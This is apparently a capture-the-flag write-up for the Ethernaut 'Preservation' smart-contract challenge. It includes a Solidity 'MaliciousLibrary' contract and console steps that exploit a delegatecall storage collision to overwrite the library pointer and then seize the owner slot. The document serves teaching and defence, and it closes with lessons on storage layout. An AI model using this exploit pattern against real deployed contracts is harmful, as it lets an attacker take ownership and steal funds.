# Level 16: Preservation

## Challenge Overview

This challenge demonstrates how a contract that uses `delegatecall` can overwrite storage in the calling contract.  
The goal is to use the `delegatecall` in the `Preservation` contract to gain ownership.



## Solution

The `Preservation` contract uses `delegatecall` to call functions in its library contracts, inheriting the context of the `Preservation` contract.  
This makes it possible to overwrite its state variables by crafting a malicious library.



## Steps to Solve

### 1. Deploy a Malicious Library Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibrary {
    // These three variables occupy slots 0, 1, and 2—matching Preservation’s layout:
    address public dummy0;  // slot 0 ← will be timeZone1Library
    address public dummy1;  // slot 1 ← will be timeZone2Library
    address public owner;   // slot 2 ← Preservation’s owner

    // When Preservation delegatecalls into this, "owner" (slot 2) is set to msg.sender
    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
```



### 2. Overwrite `timeZone1Library` in Preservation

```javascript
// In Ethernaut console:
// Convert the library address to a uint256 string:
const libUint = ethers.BigNumber.from(maliciousAddr).toString();

// Delegatecall into the genuine library’s setTime (slot 0), replacing it:
await contract.setFirstTime(libUint);

// Now, contract.timeZone1Library == maliciousAddr
```



### 3. Overwrite `owner` by Calling `setFirstTime` Again

```javascript
// Now Preservation’s delegatecall will use our malicious library.
// Pass your own EOA address as a uint256 to setTime:
const myUint = ethers.BigNumber.from(player).toString();
await contract.setFirstTime(myUint);

// In this delegatecall, MaliciousLibrary.setTime does:
//   owner = address(uint160(_time));
// Setting Preservation.owner = player
```

---

### 4. Verify that You Are Now the Owner

```javascript
console.log((await contract.owner()) === player); // → true
```



## Lessons Learned

- If the called code’s storage layout doesn’t match the caller’s, a malicious library can overwrite any slot (e.g., `owner`).  
  The `delegatecall` shares storage.

- Always ensure library contracts have no unused state or use the `library` keyword (no storage) to avoid mismatches.

- If an attacker can change your library pointer, they gain full control via `delegatecall`.
